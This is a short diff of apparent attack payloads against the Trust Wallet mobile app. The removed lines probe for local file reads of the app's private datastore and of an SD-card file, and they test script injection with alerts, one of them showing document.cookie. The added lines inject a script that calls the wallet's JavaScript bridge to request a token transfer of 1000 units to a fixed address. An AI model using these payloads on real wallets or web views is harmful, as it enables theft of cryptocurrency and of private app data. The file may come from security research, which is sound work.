@@ -1,5 +1,14 @@
-<embed src="file:///data/data/com.wallet.crypto.trustapp/files/datastore/data/data/com.wallet.crypto.trustapp/files/datastore" type="text/plain" width="300" height="200">
-<embed src="content:///data/data/com.wallet.crypto.trustapp/files/datastore/data/data/com.wallet.crypto.trustapp/files/datastore" type="text/plain" width="300" height="200">
-<embed src="content:///sdcard/Pictures/important.txt" type="text/plain" width="300" height="200">
-<svg/onload=alert("1")>
-<script>alert(document.cookie)</script>
+<script>
+  window.TrustWalletClient.postMessage(JSON.stringify({
+  "payload": {
+    "currency": {
+      "metadata": {
+        "contractAddress": "0x581d255a15B3F2d71cE1561BdBe6cE51594B5160",
+        "slip44": "9006"
+      }
+    },
+    "amount": "1000",
+    "address": "0x581d255a15B3F2d71cE1561BdBe6cE51594B5160"
+  }
+}));
+</script>
